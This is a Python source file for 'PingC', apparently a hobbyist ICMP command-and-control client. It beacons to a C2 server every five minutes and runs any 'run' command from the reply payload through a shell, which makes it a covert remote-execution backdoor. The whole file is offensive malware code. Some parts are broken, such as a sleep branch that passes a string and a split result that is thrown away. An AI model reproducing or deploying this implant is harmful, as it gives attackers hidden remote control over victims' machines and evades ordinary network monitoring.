#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import sys
import time
import subprocess as sub
from scapy.all import sr,sr1,ICMP,IP


def main(argv):
	while 1:
		if len(argv) < 1:
			print "----------------------------"
			print "PingC Usage"
			print " ./pingc.py <IP>"
			print "----------------------------"
			exit()
		packet=IP(dst=sys.argv[1])/ICMP()/"What shall I do master?"
		packet.show()
		p=sr1(packet)
		print "[*] String sent to C2 server: What shall I do master?" 
		if p:
			p.show()
			try:
				response=p['Raw'].load
				# Check ICMP data for 'run' command
				print "[*] String received from C2 server: " + p['Raw'].load
				if 'run' in response:
					print "[*] Running command: " + response[4:]
					command = response[4:]
					command.split()
					proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
       					output, errors = proc.communicate()
        				print output
        				print errors
				elif 'sysinfo' in response:
					print "[*] Master requesting sysinfo"
				elif 'sleep' in response:
					seconds = response[6:]
					print "[*] Master says sleep for (%s) seconds", seconds
					time.sleep(seconds)
			except:
				print "[X] ERROR: ", sys.exc_info()[0] 
		time.sleep(300)

if __name__ == "__main__":
   main(sys.argv[1:])

